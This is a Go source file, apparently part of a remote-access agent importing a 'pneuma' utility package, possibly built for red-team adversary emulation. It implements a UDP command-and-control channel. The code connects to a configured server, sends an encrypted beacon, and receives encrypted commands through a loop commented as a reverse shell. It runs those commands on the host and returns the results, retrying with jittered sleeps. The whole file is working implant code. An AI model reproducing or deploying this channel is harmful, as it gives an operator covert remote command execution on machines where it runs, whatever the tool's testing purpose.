package sockets

import (
	"bufio"
	"bytes"
	"encoding/json"
	"github.com/preludeorg/pneuma/util"
	"io"
	"net"
	"strings"
)

type UDP struct {}

func init() {
	util.CommunicationChannels["udp"] = UDP{}
}

func (contact UDP) Communicate(agent *util.AgentConfig, beacon util.Beacon, msg string) (util.Beacon, string) {
	for agent.Contact == "udp" {
		conn, err := net.Dial("udp", agent.Address)
	   	if err != nil {
			util.DebugLogf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
	   	} else {
			//initial beacon
			udpBufferedSend(conn, beacon)

			//reverse-shell
			scanner := bufio.NewScanner(conn)
			for scanner.Scan() && agent.Contact == "udp" {
				message := strings.TrimSpace(scanner.Text())
				if agent.Contact != "udp" {
					return beacon, message
				}
				udpRespond(conn, beacon, message, agent)
			}
	   	}
	   	jitterSleep(agent.Sleep, "UDP")
	}
	return beacon, ""
}

func udpRespond(conn net.Conn, beacon util.Beacon, message string, agent *util.AgentConfig){
	var tempB util.Beacon
	json.Unmarshal([]byte(util.Decrypt(message)), &tempB)
	beacon.Links = beacon.Links[:0]
	runLinks(&tempB, &beacon, agent, "\r\n")
	refreshBeacon(agent, &beacon)
	udpBufferedSend(conn, beacon)
}

func udpBufferedSend(conn net.Conn, beacon util.Beacon) {
	data, _ := json.Marshal(beacon)
	allData := bytes.NewReader(append(util.Encrypt(data), "\n"...))
	sendBuffer := make([]byte, 1024)
	for {
		_, err := allData.Read(sendBuffer)
		if err == io.EOF {
			return
		}
		conn.Write(sendBuffer)
	}
}